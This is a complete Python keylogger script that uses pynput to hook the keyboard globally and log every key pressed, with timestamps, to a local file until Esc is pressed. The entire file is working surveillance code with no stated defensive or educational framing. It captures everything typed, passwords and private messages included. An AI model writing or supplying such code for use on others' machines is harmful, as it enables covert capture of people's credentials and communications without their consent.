from pynput.keyboard import Key, Listener
import logging

# Save keystrokes to keylog.txt
logging.basicConfig(
    filename="keylog.txt", 
    level=logging.DEBUG, 
    format="%(asctime)s: %(message)s"
)

def on_press(key):  
    try:
        # Log standard alphanumeric keys
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys 
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    # Stop listener on pressing the escape key
    if key == Key.esc:
        print("Exiting...")
        return False

# Set up global listening
with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Monitoring.")
    listener.join()
